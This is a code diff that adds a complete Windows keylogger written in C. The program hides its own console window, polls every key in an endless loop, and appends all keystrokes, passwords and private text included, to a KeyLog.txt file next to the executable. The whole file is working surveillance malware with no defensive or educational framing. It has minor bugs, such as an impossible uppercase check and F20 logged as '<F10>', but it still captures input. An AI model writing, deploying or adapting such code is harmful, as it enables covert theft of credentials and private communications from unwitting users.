@@ -1,0 +1,130 @@
+#include <windows.h>
+#include <shlwapi.h>
+
+#include <stdio.h>
+#include <stdbool.h>
+
+void KeyboardProcess(const char* filepath)
+{
+    FILE* file = fopen(filepath, "a");
+
+    for (short keyCode = 0x08; keyCode <= 0xDE; keyCode++)
+    {
+        if (GetAsyncKeyState(keyCode) == -32767)
+        {
+            if (GetAsyncKeyState(VK_LSHIFT) ||
+                GetAsyncKeyState(VK_RSHIFT))
+                switch (keyCode) 
+                {
+		    		case '1':  fputc('!', file);  goto end;
+		    		case '2':  fputc('@', file);  goto end;
+		    		case '3':  fputc('#', file);  goto end;
+		    		case '4':  fputc('$', file);  goto end;
+		    		case '5':  fputc('%', file);  goto end;
+		    		case '6':  fputc('^', file);  goto end;
+		    		case '7':  fputc('&', file);  goto end;
+		    		case '8':  fputc('*', file);  goto end;
+		    		case '9':  fputc('(', file);  goto end;
+		    		case '0':  fputc(')', file);  goto end;
+    
+		    		case 0xBA: fputc(':', file);  break;
+		    		case 0xBB: fputc('+', file);  break;
+		    		case 0xBC: fputc('<', file);  break;
+		    		case 0xBD: fputc('_', file);  break;
+		    		case 0xBE: fputc('>', file);  break;
+		    		case 0xBF: fputc('?', file);  break;
+		    		case 0xC0: fputc('~', file);  break;
+		    		case 0xDB: fputc('{', file);  break;
+		    		case 0xDC: fputc('|', file);  break;
+		    		case 0xDD: fputc('}', file);  break;
+		    		case 0xDE: fputc('\"', file); break;
+    
+                    default:
+                    {
+                        if (keyCode <= 0x41 && keyCode >= 0x5A)
+                            fputc(toupper(keyCode), file);
+                        else
+                            fputs("<SHIFT>", file);
+                    } break;
+		    	}
+            else
+                switch (keyCode)
+                {
+                case VK_LCONTROL: fputs("<LCTRL>",     file); break;
+                case VK_RCONTROL: fputs("<RCTRL>",     file); break;
+                case VK_LMENU:    fputs("<LALT>",      file); break;
+                case VK_RMENU:    fputs("<RALT>",      file); break;
+                case VK_LWIN:     fputs("<LWIN>",      file); break;
+                case VK_RWIN:     fputs("<RWIN>",      file); break;
+                case VK_INSERT:   fputs("<INSERT>",    file); break;
+                case VK_END:      fputs("<END>",       file); break;
+                case VK_PRINT:    fputs("<PRINT>",     file); break;
+                case VK_DELETE:   fputs("<DELETE>",    file); break;
+                case VK_BACK:     fputs("<BACKSPACE>", file); break;
+                case VK_LEFT:     fputs("<LEFT>",      file); break;
+                case VK_RIGHT:    fputs("<RIGHT>",     file); break;
+                case VK_UP:       fputs("<UP>",        file); break;
+                case VK_DOWN:     fputs("<DOWN>",      file); break;
+                case VK_RETURN:   fputs("<RETURN>\n",  file); break;
+                case VK_TAB:      fputs("<TAB>",       file); break;
+
+                case VK_OEM_PLUS:   fputc('+', file); break;
+                case VK_OEM_COMMA:  fputc(',', file); break;
+                case VK_OEM_MINUS:  fputc('-', file); break;
+                case VK_OEM_PERIOD: fputc('.', file); break;
+
+                case VK_F1:  fputs("<F1>",  file); break;
+                case VK_F2:  fputs("<F2>",  file); break;
+                case VK_F3:  fputs("<F3>",  file); break;
+                case VK_F4:  fputs("<F4>",  file); break;
+                case VK_F5:  fputs("<F5>",  file); break;
+                case VK_F6:  fputs("<F6>",  file); break;
+                case VK_F7:  fputs("<F7>",  file); break;
+                case VK_F8:  fputs("<F8>",  file); break;
+                case VK_F9:  fputs("<F9>",  file); break;
+                case VK_F10: fputs("<F10>", file); break;
+                case VK_F11: fputs("<F11>", file); break;
+                case VK_F12: fputs("<F12>", file); break;
+                case VK_F13: fputs("<F13>", file); break;
+                case VK_F14: fputs("<F14>", file); break;
+                case VK_F15: fputs("<F15>", file); break;
+                case VK_F16: fputs("<F16>", file); break;
+                case VK_F17: fputs("<F17>", file); break;
+                case VK_F18: fputs("<F18>", file); break;
+                case VK_F19: fputs("<F19>", file); break;
+                case VK_F20: fputs("<F10>", file); break;
+                case VK_F21: fputs("<F21>", file); break;
+                case VK_F22: fputs("<F22>", file); break;
+                case VK_F23: fputs("<F23>", file); break;
+                case VK_F24: fputs("<F24>", file); break;
+                
+                default: fputc(tolower(keyCode), file);
+                }
+
+            end: continue;
+        }
+
+    }
+
+    fclose(file);
+}
+
+int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, LPSTR argv, int argc)
+{
+    (void) previousInstanceHandle;
+    (void) instanceHandle;
+    (void) argv;
+    (void) argc;
+
+    AllocConsole();
+    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, 0);
+
+    char processPath[MAX_PATH]; 
+    GetModuleFileName(GetModuleHandle(NULL), processPath, (sizeof(processPath)));
+    PathRemoveFileSpec(processPath);
+    strcat(processPath, "\\KeyLog.txt");
+
+    while (true)
+        KeyboardProcess(processPath);
+}
